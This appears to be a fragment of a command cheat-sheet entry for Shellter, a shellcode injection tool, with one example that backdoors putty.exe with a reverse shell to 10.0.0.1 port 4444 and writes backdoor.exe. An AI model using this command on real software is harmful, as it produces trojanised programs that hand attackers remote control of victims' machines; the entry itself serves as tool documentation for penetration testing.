...
name: shellter
description: Dynamic shellcode injection tool for creating backdoored portable executables
...
- description: Quiet mode with custom output
  command: shellter --pe putty.exe --reverse-ip 10.0.0.1 --reverse-port 4444 -o backdoor.exe
    --quiet
